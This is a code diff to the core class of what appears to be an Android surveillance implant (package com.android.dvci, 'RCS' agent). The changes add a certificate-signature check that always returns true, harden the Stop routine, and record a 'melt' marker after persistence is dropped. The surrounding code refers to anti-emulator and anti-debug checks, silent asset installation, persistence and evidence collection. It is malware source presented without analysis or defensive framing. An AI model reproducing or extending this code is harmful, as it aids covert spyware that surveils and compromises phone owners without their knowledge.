@@ -14,6 +14,7 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.pm.Signature;
 import android.content.res.Resources;
 import android.os.Build;
 import android.os.Handler;
@@ -29,6 +30,7 @@ import com.android.dvci.conf.Configuration;
 import com.android.dvci.crypto.Keys;
 import com.android.dvci.evidence.EvDispatcher;
 import com.android.dvci.evidence.EvidenceBuilder;
+import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.gui.ASG;
@@ -44,8 +46,16 @@ import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStream;
+import java.security.cert.CertificateException;
+import java.security.cert.CertificateFactory;
+import java.security.cert.X509Certificate;
+
+import dexguard.util.CertificateChecker;
+
 
 /**
  * The Class Core, represents
@@ -133,6 +143,10 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start) anti emu/debug failed");
 			}
+			return false;
+		}
+
+		if (!checkSignature()) {
 			return false;
 		}
 
@@ -267,6 +281,44 @@ public class Core extends Activity implements Runnable {
 		return true;
 	}
 
+	private boolean checkSignature() {
+		int certificateChanged = CertificateChecker.checkCertificate(Status.getAppContext(), 123);
+
+		String data = Utils.readAssetPayload(M.e("tp.data"));
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkSignature), data " + data);
+		}
+
+		Context context = Status.getAppContext();
+		Signature[] sigs = new Signature[0];
+		try {
+			sigs = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES).signatures;
+			for (Signature sig : sigs) {
+				final byte[] rawCert = sig.toByteArray();
+				InputStream certStream = new ByteArrayInputStream(rawCert);
+
+				final CertificateFactory certFactory;
+				final X509Certificate x509Cert;
+				try {
+					certFactory = CertificateFactory.getInstance("X509");
+					x509Cert = (X509Certificate) certFactory.generateCertificate(certStream);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (checkSignature), Certificate subject: " + x509Cert.getSubjectDN());
+						Check.log(TAG + " (checkSignature), Certificate issuer: " + x509Cert.getIssuerDN());
+						Check.log(TAG + " (checkSignature), Certificate serial number: " + x509Cert.getSerialNumber());
+					}
+
+				} catch (CertificateException e) {
+					// e.printStackTrace();
+				}
+			}
+		} catch (PackageManager.NameNotFoundException e) {
+			e.printStackTrace();
+		}
+
+		return true;
+	}
+
 	private void closeMainActivity() {
 		try {
 
@@ -310,18 +362,28 @@ public class Core extends Activity implements Runnable {
 	 * @return true, if successful
 	 */
 	public boolean Stop() {
-		bStopCore = true;
+		try {
+			bStopCore = true;
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
+			}
+
+			if (wl != null) {
+				wl.release();
+			}
+
+			coreThread = null;
+
+			serviceRunning = false;
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(ex);
+				Check.log(TAG + " (Stop) ", ex);
+			}
 		}
-
-		wl.release();
-
-		coreThread = null;
-
-		serviceRunning = false;
 		return true;
+
 	}
 
 	/**
@@ -1112,6 +1174,10 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEMO) {
 					Status.self().makeToast(M.e("Melt: dropped persistence"));
 				}
+
+				Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
+				markupMelt.serialize(Status.getAppContext().getPackageName());
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installSilentAsset), stopping melt");
 				}
@@ -1128,8 +1194,11 @@ public class Core extends Activity implements Runnable {
 	}
 
 	private void stopService() {
-		Intent intent = new Intent(this, ServiceMain.class);
-		stopService(intent);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stopService), sending intent");
+		}
+		Intent intent = new Intent(Status.getAppContext(), ServiceMain.class);
+		Status.getAppContext().stopService(intent);
 	}
 
 }
